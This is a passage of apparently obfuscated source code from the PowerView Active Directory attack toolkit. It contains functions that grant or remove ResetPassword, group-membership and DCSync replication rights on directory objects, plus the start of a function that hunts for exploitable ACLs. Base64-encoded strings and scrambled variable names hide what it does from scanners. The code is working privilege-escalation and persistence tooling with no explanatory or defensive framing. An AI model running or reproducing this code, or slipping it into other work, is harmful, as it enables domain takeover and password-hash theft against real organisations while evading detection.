        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${/=\/\_/\_/\__/===} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\/\/=\_/=\_/==} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/=\__/\/==\_/\/} = _____/\/==\/\_/=== @_/=\/\/=\_/=\_/==
        if (-not ${__/=\__/\/==\_/\/}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${___/===\/==\/=\_/}
        ${_/\/===\____/=\_/} = _____/\/==\/\_/=== @/=\/\_/\_/\__/===
        ForEach (${/=\__/=\___/\/=\/} in ${_/\/===\____/=\_/}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${____/=\_/\_/=\_/\} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${___/==\_/\/\_/\_/} = @()
            if ($RightsGUID) {
                ${___/\_/=\_____/\_} = @($RightsGUID)
            }
            else {
                ${___/\_/=\_____/\_} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${/====\/======\/==} in ${__/=\__/\/==\_/\/}) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${/====\/======\/==}.distinguishedname) '$Rights' on $(${/=\__/=\___/\/=\/}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${/====\/======\/==}.objectsid)
                    if (${___/\_/=\_____/\_}) {
                        ForEach (${/===\/\__/===\/=\} in ${___/\_/=\_____/\_}) {
                            ${_/\_/====\_/==\/=} = New-Object Guid ${/===\/\__/===\/=\}
                            ${_/\____/=\_/=\/\_} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${___/==\_/\/\_/\_/} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${_/\____/=\_/=\/\_}, ${____/=\_/\_/=\_/\}, ${_/\_/====\_/==\/=}, $InheritanceType
                        }
                    }
                    else {
                        ${_/\____/=\_/=\/\_} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${___/==\_/\/\_/\_/} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${_/\____/=\_/=\/\_}, ${____/=\_/\_/=\_/\}, $InheritanceType
                    }
                    ForEach (${/=\_/====\_/=\/\/} in ${___/==\_/\/\_/\_/}) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${/====\/======\/==}.distinguishedname) rights GUID '$(${/=\_/====\_/=\/\/}.ObjectType)' on $(${/=\__/=\___/\/=\/}.Properties.distinguishedname)"
                        ${/=\/=\/=\_/\___/=} = ${/=\__/=\___/\/=\/}.GetDirectoryEntry()
                        ${/=\/=\/=\_/\___/=}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${/=\/=\/=\_/\___/=}.PsBase.ObjectSecurity.AddAccessRule(${/=\_/====\_/=\/\/})
                        ${/=\/=\/=\_/\___/=}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $(${/====\/======\/==}.distinguishedname) '$Rights' on $(${/=\__/=\___/\/=\/}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Remove-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${___/===\/==\/=\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${/=\/\_/\_/\__/===} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\/\/=\_/=\_/==} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/=\__/\/==\_/\/} = _____/\/==\/\_/=== @_/=\/\/=\_/=\_/==
        if (-not ${__/=\__/\/==\_/\/}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${/=\/\_/\_/\__/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${___/===\/==\/=\_/}
        ${_/\/===\____/=\_/} = _____/\/==\/\_/=== @/=\/\_/\_/\__/===
        ForEach (${/=\__/=\___/\/=\/} in ${_/\/===\____/=\_/}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${____/=\_/\_/=\_/\} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${___/==\_/\/\_/\_/} = @()
            if ($RightsGUID) {
                ${___/\_/=\_____/\_} = @($RightsGUID)
            }
            else {
                ${___/\_/=\_____/\_} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${/====\/======\/==} in ${__/=\__/\/==\_/\/}) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $(${/====\/======\/==}.distinguishedname) '$Rights' from $(${/=\__/=\___/\/=\/}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${/====\/======\/==}.objectsid)
                    if (${___/\_/=\_____/\_}) {
                        ForEach (${/===\/\__/===\/=\} in ${___/\_/=\_____/\_}) {
                            ${_/\_/====\_/==\/=} = New-Object Guid ${/===\/\__/===\/=\}
                            ${_/\____/=\_/=\/\_} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${___/==\_/\/\_/\_/} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${_/\____/=\_/=\/\_}, ${____/=\_/\_/=\_/\}, ${_/\_/====\_/==\/=}, $InheritanceType
                        }
                    }
                    else {
                        ${_/\____/=\_/=\/\_} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${___/==\_/\/\_/\_/} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${_/\____/=\_/=\/\_}, ${____/=\_/\_/=\_/\}, $InheritanceType
                    }
                    ForEach (${/=\_/====\_/=\/\/} in ${___/==\_/\/\_/\_/}) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $(${/====\/======\/==}.distinguishedname) rights GUID '$(${/=\_/====\_/=\/\/}.ObjectType)' on $(${/=\__/=\___/\/=\/}.Properties.distinguishedname)"
                        ${/=\/=\/=\_/\___/=} = ${/=\__/=\___/\/=\/}.GetDirectoryEntry()
                        ${/=\/=\/=\_/\___/=}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${/=\/=\/=\_/\___/=}.PsBase.ObjectSecurity.RemoveAccessRule(${/=\_/====\_/=\/\/})
                        ${/=\/=\/=\_/\___/=}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $(${/====\/======\/==}.distinguishedname) '$Rights' from $(${/=\__/=\___/\/=\/}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Find-InterestingDomainAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,
        [Switch]
        $ResolveGUIDs,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_____/==\/=\___/\} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))] = $ResolveGUIDs }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))] = $RightsFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/=\/=\_/=\/=\/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
